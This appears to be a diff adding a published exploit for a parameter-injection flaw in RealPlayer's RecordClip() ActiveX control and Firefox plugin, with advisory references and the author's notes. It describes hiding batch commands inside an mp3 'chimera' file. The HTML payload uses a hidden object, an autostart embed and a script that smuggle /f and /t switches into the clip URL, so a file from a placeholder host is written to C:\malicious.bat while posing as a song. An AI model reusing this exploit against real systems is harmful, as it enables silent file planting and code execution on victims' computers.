@@ -1,0 +1,44 @@
+Sources:  http://www.securityfocus.com/bid/44443/info
+          http://packetstormsecurity.org/files/view/97522/recordingmanager-ie.txt
+<html>
+
+<p>
+Written by Sean de Regge (seanderegge hotmail.com)
+
+Exploit for the parameter injection bug in Realplayers RecordClip() activeX function and firefox plugin
+http://www.zerodayinitiative.com/advisories/ZDI-10-211/
+
+C:\Program Files\Real\RealPlayer\RecordingManager.exe has 2 interesting switches:
+/t will spoof the download of any file so you can make it look like it's downloading a normal mp3 file
+/f will make it download to any location on the disk instead of the realplayer downloads folder
+
+Restrictions:
+The extension on server side must be a valid media file (ie: .mp3)
+Realplayer does some checks on the file to see if it is a valid media file too, so we need to create a 
+chimera file, which will parse as a valid mp3 file and a valid batch file.
+Best is to take a valid mp3 file and modify it in a hex editor to have your batch commands in the first couple of bytes.
+</p>
+
+<OBJECT ID="obj" WIDTH=0 HEIGHT=0 CLASSID="CLSID:FDC7A535-4070-4B92-A0EA-D9994BCC0DC5">
+</OBJECT>
+<embed type="audio/x-pn-realaudio-plugin"
+
+
+    controls="ImageWindow"
+    console="video1"
+    src='http://xx.xx.xx.xx/batch_file_in_mp3.mp3" /f C:\\malicious.bat /t cool_song.mp3'
+    width="240"
+    height="180"
+    autostart=true>
+
+ </embed> 
+<script>
+
+
+var file = 'http://xx.xx.xx.xx/batch_file_in_mp3.mp3" /f C:\\malicious.bat /t cool_song.mp3';
+
+obj.RecordClip(file, "audio/mpeg3", "clipInfo");
+	
+
+</script>
+</html>
